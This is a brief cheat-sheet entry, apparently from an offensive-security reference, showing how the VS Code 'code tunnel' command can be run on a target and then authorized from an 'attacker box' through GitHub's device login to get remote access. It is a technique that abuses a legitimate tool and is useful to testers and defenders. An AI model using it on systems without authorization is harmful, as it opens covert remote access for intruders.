code
====

Download
--------

[Sudo]
    code tunnel --name xxxxxx
    This requires a valid GitHub account.

Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

    code tunnel --name xxxxxx
